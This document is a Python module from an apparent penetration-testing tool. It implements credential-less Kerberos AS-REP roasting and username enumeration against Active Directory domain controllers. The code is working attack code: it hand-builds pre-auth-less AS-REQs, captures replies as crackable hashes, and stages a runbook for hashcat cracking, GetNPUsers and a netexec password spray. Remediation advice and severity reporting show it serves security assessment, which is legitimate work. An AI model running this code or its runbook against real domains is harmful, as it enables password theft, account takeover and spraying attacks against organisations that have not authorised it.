"""Credential-less Active Directory roasting (stdlib only).

A minimal Kerberos client - hand-rolled ASN.1 DER over TCP 88, no impacket - that
needs NO credential, only a DC and a list of candidate usernames. For each name it
sends an AS-REQ with no pre-authentication and reads the KDC's reply:

  * **AS-REP returned** -> the account has "do not require Kerberos pre-auth"
    (DONT_REQ_PREAUTH) set. recce captures the encrypted part as a crackable
    `$krb5asrep$` hash - AS-REP roasting with no credential (crack offline -> a real
    password). CONFIRMED high (critical if the account is privileged).
  * **KRB-ERROR KDC_ERR_PREAUTH_REQUIRED (25)** -> the username is VALID (pre-auth is
    enforced). Username enumeration with no credential.
  * **KRB-ERROR KDC_ERR_C_PRINCIPAL_UNKNOWN (6)** -> the username does not exist.

Candidate usernames come from what recce already enumerated (LDAP / SharpHound user
accounts in the datastore) or an operator `--userlist`. recce only requests tickets -
it makes no logon attempt and locks out no account. Findings fold into the severity
totals, the Vulnerabilities sheet, the write-ups, a dedicated **Kerberos** tab, and
the prove engine. Safety posture: SECURITY.md.
"""
from __future__ import annotations

import socket
import struct

from .models import Host, Port

_PORT = 88
_TIMEOUT = 6.0

# KRB error codes we care about.
KDC_ERR_PRINCIPAL_UNKNOWN = 6
KDC_ERR_CLIENT_REVOKED = 18
KDC_ERR_KEY_EXPIRED = 23
KDC_ERR_PREAUTH_REQUIRED = 25
KDC_ERR_WRONG_REALM = 68

# etype numbers; RC4-HMAC (23) first so we get the classic crackable AS-REP.
_ETYPES = (23, 17, 18)


def is_kerberos(port: Port) -> bool:
    if port.portid == _PORT:
        return True
    return "kerberos" in f"{port.service} {port.product}".lower()


# --- minimal ASN.1 DER -----------------------------------------------------------

def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _int(n: int) -> bytes:
    if n == 0:
        body = b"\x00"
    else:
        body = b""
        v = n
        while v:
            body = bytes([v & 0xFF]) + body
            v >>= 8
        if body[0] & 0x80:                             # keep it positive
            body = b"\x00" + body
    return _tlv(0x02, body)


def _gstr(s: str) -> bytes:
    return _tlv(0x1B, s.encode("utf-8"))               # GeneralString


def _gtime(s: str) -> bytes:
    return _tlv(0x18, s.encode("ascii"))               # GeneralizedTime


def _ctx(n: int, content: bytes) -> bytes:
    return _tlv(0xA0 | n, content)                     # [n] explicit, constructed


def _seq(*items: bytes) -> bytes:
    return _tlv(0x30, b"".join(items))


def _bitstring32(val: int) -> bytes:
    return _tlv(0x03, b"\x00" + struct.pack(">I", val))


def _principal(ntype: int, names: list[str]) -> bytes:
    return _seq(_ctx(0, _int(ntype)),
                _ctx(1, _seq(*[_gstr(n) for n in names])))


def build_as_req(user: str, realm: str, etypes=_ETYPES,
                 till: str = "20370913024805Z", nonce: int = 0x7FFFFFFE) -> bytes:
    """A pre-auth-less AS-REQ for (user, realm). realm should be upper-case."""
    body = _seq(
        _ctx(0, _bitstring32(0x40810010)),             # kdc-options (fwd/renew/canon)
        _ctx(1, _principal(1, [user])),                # cname (NT-PRINCIPAL)
        _ctx(2, _gstr(realm)),                         # realm
        _ctx(3, _principal(2, ["krbtgt", realm])),     # sname krbtgt/REALM
        _ctx(5, _gtime(till)),                          # till
        _ctx(7, _int(nonce)),                           # nonce
        _ctx(8, _seq(*[_int(e) for e in etypes])),      # etype
    )
    kdc_req = _seq(
        _ctx(1, _int(5)),                               # pvno
        _ctx(2, _int(10)),                              # msg-type = AS-REQ
        _ctx(4, body),                                  # req-body
    )
    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10]


def _read_tlv(data: bytes, i: int):
    """Return (tag, content_bytes, next_index) for the DER TLV at `i`."""
    if i + 2 > len(data):
        raise ValueError("DER: truncated header")
    tag = data[i]
    length = data[i + 1]
    j = i + 2
    if length & 0x80:
        nbytes = length & 0x7F
        if nbytes == 0 or j + nbytes > len(data):
            raise ValueError("DER: bad length")
        length = int.from_bytes(data[j:j + nbytes], "big")
        j += nbytes
    if j + length > len(data):
        raise ValueError("DER: content overruns buffer")
    return tag, data[j:j + length], j + length


def _children(content: bytes):
    i = 0
    while i < len(content):
        tag, val, i = _read_tlv(content, i)
        yield tag, val


def _find(content: bytes, tag: int):
    for t, val in _children(content):
        if t == tag:
            return val
    return None


def _ctx_inner(content: bytes, n: int):
    """Value inside an explicit [n] context tag (unwrap one TLV), or None."""
    wrapped = _find(content, 0xA0 | n)
    if wrapped is None:
        return None
    _t, val, _ = _read_tlv(wrapped, 0)
    return val


# --- response parsing ------------------------------------------------------------

def parse_response(data: bytes) -> dict:
    """Classify a KDC reply. Returns one of:
        {"type": "asrep", "user", "realm", "etype", "cipher"}
        {"type": "error", "code": <int>}
        {"type": "unknown"}
    """
    try:
        tag, body, _ = _read_tlv(data, 0)
        _t, seq, _ = _read_tlv(body, 0)               # inner SEQUENCE
        if tag == 0x7E:                                # [APPLICATION 30] KRB-ERROR
            err = _ctx_inner(seq, 6)                   # error-code [6]
            code = int.from_bytes(err, "big") if err else -1
            return {"type": "error", "code": code}
        if tag == 0x6B:                                # [APPLICATION 11] AS-REP
            crealm_s = _ctx_inner(seq, 3)              # crealm [3] GeneralString
            realm = crealm_s.decode("utf-8", "replace") if crealm_s else ""
            cname = _ctx_inner(seq, 4)                 # cname [4] PrincipalName
            user = ""
            if cname:
                names = _ctx_inner(cname, 1)           # name-string [1] SEQ OF GStr
                if names:
                    first = _find(names, 0x1B)
                    user = first.decode("utf-8", "replace") if first else ""
            enc = _ctx_inner(seq, 6)                    # enc-part [6] EncryptedData
            etype, cipher = 0, b""
            if enc:
                et = _ctx_inner(enc, 0)                # etype [0] Int32
                etype = int.from_bytes(et, "big") if et else 0
                cipher = _ctx_inner(enc, 2) or b""     # cipher [2] OCTET STRING
            return {"type": "asrep", "user": user, "realm": realm,
                    "etype": etype, "cipher": cipher}
    except (ValueError, IndexError):
        return {"type": "unknown"}
    return {"type": "unknown"}


def asrep_hash(user: str, realm: str, etype: int, cipher: bytes) -> str:
    """Format an AS-REP cipher as a crackable hash. etype 23 (RC4) -> hashcat 18200
    `$krb5asrep$23$user@REALM:<checksum>$<edata>`; other etypes -> a generic form."""
    if etype == 23 and len(cipher) >= 16:
        return (f"$krb5asrep$23${user}@{realm}:"
                f"{cipher[:16].hex()}${cipher[16:].hex()}")
    return f"$krb5asrep${etype}${user}@{realm}${cipher.hex()}"


# --- transport -------------------------------------------------------------------

def _send_recv(dc_ip: str, payload: bytes, timeout: float) -> bytes | None:
    """Kerberos over TCP: 4-byte length prefix + message, both directions."""
    try:
        sock = socket.create_connection((dc_ip, _PORT), timeout=timeout)
    except OSError:
        return None
    try:
        sock.settimeout(timeout)
        sock.sendall(struct.pack(">I", len(payload)) + payload)
        hdr = _recvn(sock, 4, timeout)
        if hdr is None:
            return None
        n = struct.unpack(">I", hdr)[0]
        if n == 0 or n > 4 * 1024 * 1024:
            return None
        return _recvn(sock, n, timeout)
    except OSError:
        return None
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _recvn(sock, n: int, timeout: float):
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(min(65536, n - len(buf)))
        except (socket.timeout, OSError):
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


def roast_user(dc_ip: str, realm: str, user: str,
               timeout: float = _TIMEOUT) -> dict:
    """AS-REQ one user. Returns {user, state, hash?, etype?, code?} where state is
    'roastable' | 'valid' | 'unknown_user' | 'locked' | 'error' | 'no_reply'."""
    realm = realm.upper()
    reply = _send_recv(dc_ip, build_as_req(user, realm), timeout)
    if reply is None:
        return {"user": user, "state": "no_reply"}
    r = parse_response(reply)
    if r["type"] == "asrep":
        return {"user": user, "state": "roastable", "etype": r["etype"],
                "hash": asrep_hash(user, realm, r["etype"], r["cipher"])}
    if r["type"] == "error":
        code = r["code"]
        if code == KDC_ERR_PREAUTH_REQUIRED:
            return {"user": user, "state": "valid", "code": code}
        if code == KDC_ERR_PRINCIPAL_UNKNOWN:
            return {"user": user, "state": "unknown_user", "code": code}
        if code in (KDC_ERR_CLIENT_REVOKED, KDC_ERR_KEY_EXPIRED):
            return {"user": user, "state": "locked", "code": code}
        return {"user": user, "state": "error", "code": code}
    return {"user": user, "state": "unknown"}


# --- candidate users / realm / DC ------------------------------------------------

def candidate_users(hosts: list[Host]) -> list[str]:
    """Distinct user account names recce already enumerated (LDAP / SharpHound)."""
    seen, out = set(), []
    for h in hosts:
        for a in getattr(h, "accounts", None) or []:
            if getattr(a, "kind", "") == "user" and a.name:
                low = a.name.lower()
                if low not in seen and "$" not in a.name:      # skip machine accounts
                    seen.add(low)
                    out.append(a.name)
    return out


def dc_ip_for(hosts: list[Host]) -> str:
    for h in hosts:
        if any(is_kerberos(p) for p in h.open_ports):
            return h.ip
    return ""


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "asrep_roast": (
        "The account has Kerberos pre-authentication disabled (DONT_REQ_PREAUTH), so "
        "recce requested an AS-REP for it with NO credential and captured the encrypted "
        "blob - a crackable hash. Crack it offline (hashcat -m 18200) to recover the "
        "account's real password, then reuse it: a single roastable service or admin "
        "account is often the first foothold in the domain. Require Kerberos pre-auth on "
        "every account (clear DONT_REQ_PREAUTH) and use long random passwords."),
    "user_enum": (
        "The domain controller answers AS-REQs differently for valid and invalid "
        "usernames (PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN), so recce validated real "
        "usernames from a wordlist with no credential and no logon attempt (no "
        "lockouts). A confirmed user list is the input for password spraying, AS-REP / "
        "Kerberoasting, and targeted phishing."),
}


def narrative_for(kind: str) -> str:
    return _NARRATIVE.get(kind, "")


TESTING_NARRATIVE = [
    ("1. Kerberos client (stdlib ASN.1 DER)",
     "recce builds a Kerberos AS-REQ by hand - no impacket - and speaks it to the DC "
     "over TCP 88. It needs no credential."),
    ("2. AS-REP roasting (no credential)",
     "For each candidate user it sends an AS-REQ with no pre-authentication. If the DC "
     "returns an AS-REP, the account has pre-auth disabled and recce captures the "
     "encrypted part as a $krb5asrep$ hash to crack offline (hashcat -m 18200)."),
    ("3. Username enumeration (no lockouts)",
     "A KDC_ERR_PREAUTH_REQUIRED reply means the username is valid; "
     "KDC_ERR_C_PRINCIPAL_UNKNOWN means it does not exist. recce only requests "
     "tickets - it never attempts a logon, so nothing is locked out."),
    ("4. Runbook",
     "The exact follow-on commands (hashcat -m 18200, GetNPUsers, a spray with the "
     "confirmed user list) are staged."),
]


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
    return {"category": "kerberos", "severity": sev, "title": title, "target": target,
            "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
            "cwes": list(cwes), "kind": kind, "narrative": _NARRATIVE.get(kind, "")}


def findings(dc_ip: str, realm: str, results: list[dict],
             privileged: set | None = None) -> list[dict]:
    privileged = {p.lower() for p in (privileged or set())}
    out: list[dict] = []
    tgt = f"{dc_ip}:88"
    roasted = [r for r in results if r["state"] == "roastable"]
    for r in roasted:
        priv = r["user"].lower() in privileged
        et = r.get("etype")
        # etype 23 (RC4) is the classic hashcat -m 18200 hash; an AES AS-REP (17/18,
        # issued when RC4 is disabled) is still roastable but cracks with john's
        # krb5asrep format, not -m 18200 - say so honestly.
        if et == 23:
            crack = f"hashcat -m 18200 asrep.hash rockyou.txt   # {r['user']}@{realm}"
        else:
            crack = (f"john --format=krb5asrep asrep.hash   # AES AS-REP (etype {et}), "
                     "not hashcat -m 18200")
        out.append(_finding(
            "critical" if priv else "high",
            "AS-REP roastable account (pre-auth disabled)"
            + (" - privileged" if priv else ""),
            tgt,
            f"{r['user']}@{realm} has DONT_REQ_PREAUTH set; recce captured a live "
            f"AS-REP (etype {et}) with no credential. Crack it offline for the "
            f"plaintext password.\n\n{r.get('hash', '')}",
            "hashcat" if et == 23 else "john",
            crack,
            "Require Kerberos pre-authentication on the account (clear DONT_REQ_PREAUTH) "
            "and enforce a long random password.",
            ["CWE-262"], kind="asrep_roast"))
    valid = [r for r in results if r["state"] in ("valid", "locked", "roastable")]
    if valid:
        names = ", ".join(r["user"] for r in valid[:15])
        out.append(_finding(
            "medium", "Kerberos username enumeration (no credential)", tgt,
            f"The DC confirmed {len(valid)} valid username(s) with no credential and no "
            f"logon attempt (no lockouts): {names}. This user list feeds spraying, "
            "AS-REP / Kerberoasting and phishing.",
            "kerbrute / GetNPUsers",
            f"impacket-GetNPUsers {realm}/ -no-pass -usersfile users.txt -dc-ip {dc_ip}",
            "Username enumeration via Kerberos pre-auth is largely inherent; minimise "
            "predictable names, monitor AS-REQ volume, and alert on pre-auth-disabled "
            "accounts.",
            ["CWE-204"], kind="user_enum"))
    return out


# --- runbook + proof + analyze --------------------------------------------------

def runbook(dc_ip: str, realm: str) -> list[dict]:
    steps = [
        ("enumerate", "GetNPUsers", f"impacket-GetNPUsers {realm}/ -no-pass "
         f"-usersfile users.txt -dc-ip {dc_ip} -format hashcat",
         "AS-REP roast every pre-auth-disabled user with no credential."),
        ("crack", "hashcat", "hashcat -m 18200 asrep.hash rockyou.txt",
         "Recover the plaintext password from a captured AS-REP."),
        ("spray", "netexec", f"netexec smb {dc_ip} -u users.txt -p '<cracked>' "
         "--continue-on-success",
         "Reuse a cracked/likely password across the confirmed user list."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from . import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "kerberos", _PORT)


def analyze(hosts: list[Host], users: list[str] | None = None,
            realm: str = "", dc_ip: str = "", privileged: set | None = None,
            active: bool = True, max_users: int = 1500,
            budget: float | None = None, progress=None) -> dict:
    """Full credential-less roast/enum. `users` defaults to enumerated account names;
    `realm`/`dc_ip` fall back to derived domains / a host with 88 open. `budget` caps
    wall-clock seconds; `progress(i, n, user)` fires per AS-REQ. Returns
    {dc_ip, realm, results, findings, runbooks, stats}."""
    from . import ad, svcprobe
    dc_ip = dc_ip or dc_ip_for(hosts)
    if not realm:
        doms = ad.derive_domains([h for h in hosts if h.is_up])
        realm = (doms[0].name if doms else "").upper()
    users = users or candidate_users(hosts)
    users = users[:max_users]
    results: list[dict] = []
    state: dict = {}
    if active and dc_ip and realm and users:
        for _u, r in svcprobe.iter_probe(
                users, lambda u: roast_user(dc_ip, realm, u),
                budget=budget, progress=progress, state=state):
            results.append(r)
    fs = findings(dc_ip, realm, results, privileged) if results else []
    return {"dc_ip": dc_ip, "realm": realm, "results": results, "findings": fs,
            # `targets` lets _service_module_coverage credit the DC as scanned even
            # when nothing was roastable (no folded vuln would otherwise mark it).
            "targets": [{"ip": dc_ip, "port": 88}] if dc_ip else [],
            "runbooks": [{"target": f"{dc_ip}:88", "ip": dc_ip,
                          "credfree": runbook(dc_ip, realm), "credentialed": []}]
            if dc_ip else [],
            "stats": {"users_tested": len(results),
                      "roastable": sum(1 for r in results if r["state"] == "roastable"),
                      "valid": sum(1 for r in results
                                   if r["state"] in ("valid", "locked", "roastable")),
                      "findings": len(fs), "stopped": state.get("stopped")}}
